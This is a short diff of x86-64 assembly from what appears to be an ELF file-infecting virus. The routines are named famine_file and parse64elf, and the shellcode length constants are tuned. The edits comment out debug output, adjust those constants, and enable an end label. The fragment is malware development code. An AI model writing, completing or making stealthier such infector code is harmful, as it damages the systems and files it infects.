@@ -552,7 +552,7 @@ famine_file:
 	sub rsp, 8; void *file returned by mmap
 	sub rsp, 4 ;fd
 	
-	call ft_puts ;PRINT FNAME FOR DEBUGGING
+	;call ft_puts ;PRINT FNAME FOR DEBUGGING
 
 	mov [rsp + 20], rdi
 	call open_file
@@ -628,7 +628,7 @@ famine_file:
 	mov rdi, [rsp] ; close(fd)
 	syscall
 
-	call debug
+	;call debug
 
 	add rsp, 4
 	add rsp, 8
@@ -817,9 +817,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 6090 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 6039 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6034 
+%define SHELLCODE_LEN 6080 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6029 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6024 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -2576,4 +2576,4 @@ find_end_text_seg32:
 	pop rdi
 retn
 
-;end_of_everything:
+end_of_everything:
